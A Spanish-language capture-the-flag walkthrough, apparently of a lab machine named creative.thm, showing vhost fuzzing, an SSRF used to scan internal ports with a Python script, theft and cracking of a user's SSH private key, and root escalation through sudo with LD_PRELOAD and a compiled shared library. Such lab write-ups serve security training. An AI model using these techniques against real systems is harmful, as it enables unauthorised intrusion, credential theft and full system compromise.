Realizamos un escaneo de nmap y encontramos el puerto 80 abierto
![[Pasted image 20240620114710.png]]

Al acceder detectamos que no resuelve el nombre
![[Pasted image 20240620114744.png]]

Añadimos el nombre a nuestro fichero /etc/hosts
![[Pasted image 20240620114848.png]]

Ahora al acceder ya vemos la web y podemos comenzar a analizarla
![[Pasted image 20240620114937.png]]

Hacemos fuzzing con dirbuster y encontramos un subdominio
```
gobuster vhost -u http://creative.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 40
```
![[Pasted image 20240620130006.png]]

Entramos a la ulr y encontramos una barra para escribir dominios, probamos a crear un servidor y a crear un archivo a ver si lo lee
![[Pasted image 20240620132139.png]]

Al escribir la url encontramos que nos ha leido el fichero
![[Pasted image 20240620132211.png]]

Ahora cargaremos un payload para obtener una reverse shell
![[Pasted image 20240620132329.png]]

Intentamos ejecutar la reverse shell pero sin respuesta, si escribirmos `http://localhost` nos enumera la pagina
![[Pasted image 20240620134211.png]]

Así que probaremos a enumerar todos los puertos con burpsuite para averiguar si hay algun servicio mas abierto, para ello generaremos un script el cual podamos insertar todos los puertos en burpsuite y realizar un ataque de fuerza bruta
```Bash
#!/bin/bash

# Nombre del archivo de salida
output_file="puertos.txt"

# Generar los números del 1 al 100
for (( port=1; port<=65535; port++ ))
do
    echo "$port" >> "$output_file"
done

echo "Se ha generado el archivo $output_file con los puertos del 1 al 65535."
```
![[Pasted image 20240620140015.png]]
![[Pasted image 20240620135924.png]]

Preparamos el ataque
![[Pasted image 20240620140101.png|1000]]

Cargamos el fichero previamente generado con el script
![[Pasted image 20240620140138.png]]

Y ejecutamos el ataque con burpsuite, podemos identificar los puertos que tienen un servicio los cuales contengan diferentes caracteres a 184
![[Pasted image 20240620141241.png]]



También podemos hacer esto mas rapido con el siguiente script
```Python
import requests  
import urllib.parse  
from concurrent.futures import ThreadPoolExecutor  
  
def send_post_request(url, payload, headers):  
    try:  
        response = requests.post(url, data=payload, headers=headers)  
        content_length = response.headers.get('Content-Length')  
        if content_length != '13':  # Check if content length isn't 13  
            print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")  
    except requests.exceptions.RequestException as e:  
        print(f"Error sending POST request: {e}")  
  
def main():  
    base_url = "http://beta.creative.thm"  
    headers = {  
        "Host": "beta.creative.thm",  
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",  
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  
        "Accept-Language": "en-US,en;q=0.5",  
        "Accept-Encoding": "gzip, deflate, br",  
        "Content-Type": "application/x-www-form-urlencoded",  
        "Origin": "http://beta.creative.thm",  
        "Connection": "close",  
        "Referer": "http://beta.creative.thm/",  
        "Upgrade-Insecure-Requests": "1"  
    }  
  
    # Using ThreadPoolExecutor to run 20 threads concurrently  
    with ThreadPoolExecutor(max_workers=20) as executor:  
        for port_number in range(1, 65536):  
            url = f"http://localhost:{port_number}"  
            payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"  
            executor.submit(send_post_request, base_url, payload, headers)  
  
if __name__ == "__main__":  
    main()
```
![[Pasted image 20240620141140.png]]

Al ejecutarlo nos muestra los puertos abiertos
![[Pasted image 20240620141202.png]]

Encontramos el puerto 1337, lo escribimos en el buscador y nos abre los directorios del sistema
![[Pasted image 20240620141522.png]]
![[Pasted image 20240620141458.png]]

Leemos el fichero /etc/passwd y obtenemos los usuarios
![[Pasted image 20240620143356.png]]
![[Pasted image 20240620143440.png]]

Si clickamos a view source page podremos verlo mejore
![[Pasted image 20240620143517.png]]
![[Pasted image 20240620143535.png]]

Encontramos el usuario saad, ahora nos descargaremos la clave privada para entrar por ssh
![[Pasted image 20240620144844.png]]
![[Pasted image 20240620144822.png]]

Copiamos la clave en un archivo y le asignamos los permisos, al intentar acceder nos solicita una clave
![[Pasted image 20240620150343.png]]
![[Pasted image 20240620150327.png]]
![[Pasted image 20240620150428.png]]

Para obtener la clave la pasaremos primero a texto plano
![[Pasted image 20240620145822.png]]

Y ahora la crackearemos con john the ripper
![[Pasted image 20240620150021.png]]

Ahora volvemos a probar y ya estaremos dentro
![[Pasted image 20240620150222.png]]

Enumerando informacion encontramos que al revisar el historial del usuario nos muestra unas credenciales, probamos a usar sudo -l y al solciitarnos las credenciales las escribimos y como podemos ver nos ha dado resultado, encontramos la variable `LD_Preload`, revisando por internet encontramos lo sigueinte el siguiente blog
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
![[Pasted image 20240621080716.png]]

Vamos a probar a obtener la escalada de privilegios con esta variable, para ello creamos el siguiente archivo en c
![[Pasted image 20240621082335.png]]

Siguiendo los siguientes pasos obtenemos acceso a root sin usar la password, los comandos hacen lo siguiente
![[Pasted image 20240621083610.png]]

- `nano shell.c`: Estamos creando la funcion en c
- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`: Este comando compila el archivo `shell.c` en una biblioteca compartida (`shell.so`). Los parámetros `-fPIC` y `-shared` son comunes en la compilación de bibliotecas compartidas en Unix/Linux. `-nostartfiles` se usa para evitar la vinculación con archivos de inicio estándar, lo cual es relevante para la creación de bibliotecas compartidas que no necesitan esos archivos.
- `ls -al shell.so`: Listamos el archivo compilado y sus permisos
- `sudo LD_PRELOAD=/tmp/shell.so find`: Aqui estamos usando `sudo` para ejecutar `find` con `LD_PRELOAD` establecido en `/tmp/shell.so`. Esto significa que cuando `find` se ejecute, cargará la biblioteca compartida `shell.so` (renombrada a `/tmp/shell.so`), y debido a la función `_init()` que hemos definido, ejecutará `/bin/sh` con privilegios de superusuario (`root`).

